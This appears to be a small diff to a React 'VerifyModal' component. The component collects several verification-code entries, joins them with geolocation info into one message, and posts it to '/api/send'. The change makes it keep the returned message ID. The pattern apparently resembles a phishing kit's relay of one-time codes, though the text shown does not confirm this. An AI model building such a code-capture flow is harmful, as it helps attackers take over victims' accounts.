@@ -15,7 +15,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageContent } = store();
+    const { geoInfo, messageId, messageContent, setMessageId, setMessageContent } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -66,10 +66,14 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;
 
         try {
-            await axios.post('/api/send', {
+            const res = await axios.post('/api/send', {
                 message: updatedMessage,
                 message_id: messageId
             });
+
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+            }
 
             setMessageContent(updatedMessage);
 
